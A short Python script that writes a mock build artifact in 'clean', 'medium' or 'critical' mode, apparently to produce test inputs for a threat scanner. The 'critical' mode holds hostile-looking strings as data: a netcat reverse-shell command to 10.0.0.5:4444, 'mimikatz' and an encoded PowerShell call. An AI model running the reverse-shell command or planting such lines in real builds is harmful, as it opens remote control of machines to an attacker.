import os

ARTIFACT_PATH = "../dataset/current_build.txt"

def generate_build(mode="clean"):

    if mode == "clean":
        content = "print('Hello World')"

    elif mode == "medium":
        content = """
        whoami
        powershell -enc test
        """

    elif mode == "critical":
        content = """
        mimikatz
        powershell -enc attack
        nc -e cmd.exe 10.0.0.5 4444
        base64payloadstringaaaaaaaaaaaaaaaaaaaa
        """

    else:
        content = "print('Default Build')"

    with open(ARTIFACT_PATH, "w") as f:
        f.write(content)

    print(f"Build generated in {mode.upper()} mode.")